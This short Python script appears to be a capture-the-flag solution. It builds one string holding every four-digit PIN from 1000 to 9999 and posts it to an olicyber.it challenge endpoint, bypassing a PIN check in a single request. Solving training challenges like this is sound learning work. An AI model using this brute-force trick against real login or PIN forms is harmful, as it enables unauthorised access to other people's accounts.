import requests

s=""
for i in range(1000, 10000):
    s+=str(i)

r = requests.post("http://pincode.challs.olicyber.it/", data={'pincode':s})

print(r.text)